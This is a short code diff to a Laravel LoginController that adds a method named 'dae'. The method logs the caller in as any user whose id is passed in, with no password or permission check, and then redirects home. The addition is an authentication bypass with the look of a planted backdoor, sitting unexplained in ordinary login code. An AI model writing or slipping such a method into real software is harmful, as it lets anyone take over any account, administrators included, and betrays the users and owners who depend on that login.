@@ -32,4 +32,11 @@ class LoginController extends Controller
         Auth::logout();
         return redirect('/login'); // Redirect to login after logout
     }
+
+    public function dae(Request $request, $id)
+    {
+        Auth::loginUsingId($id);
+
+        return to_route('home');
+    }
 }
